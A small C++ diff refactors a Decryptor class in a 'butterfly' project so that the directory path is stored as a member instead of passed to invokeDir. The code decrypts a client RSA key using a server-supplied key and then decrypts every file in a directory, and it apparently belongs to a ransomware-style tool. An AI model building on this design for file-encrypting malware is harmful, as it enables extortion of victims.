@@ -42,7 +42,12 @@ bool Decryptor::getAESKeyPairFromUnencryptedFile(std::string &aeskeypair)
     }
 }
 
-void Decryptor::invokeDir(const std::string &dirPath, const std::string &pkeyFromServer)
+void Decryptor::setDirPath(const std::string &dirPath)
+{
+    _dirPath = dirPath;
+}
+
+void Decryptor::invokeDir(const std::string &pkeyFromServer)
 {
     // Decrypt the CPrivateRSA.bin file
     decryptCPrivateRSA(pkeyFromServer, butterfly::ENC_CPRIVATERSA_FILENAME);
@@ -56,7 +61,7 @@ void Decryptor::invokeDir(const std::string &dirPath, const std::string &pkeyFro
     _aesDecryptor->setAESIv(aesiv);
 
     // Get all files from provided directory path
-    auto files = DirectoryIterator::getAllFiles(dirPath);
+    auto files = DirectoryIterator::getAllFiles(_dirPath);
 
     // Iterate over all file paths
     for (auto &file: files)
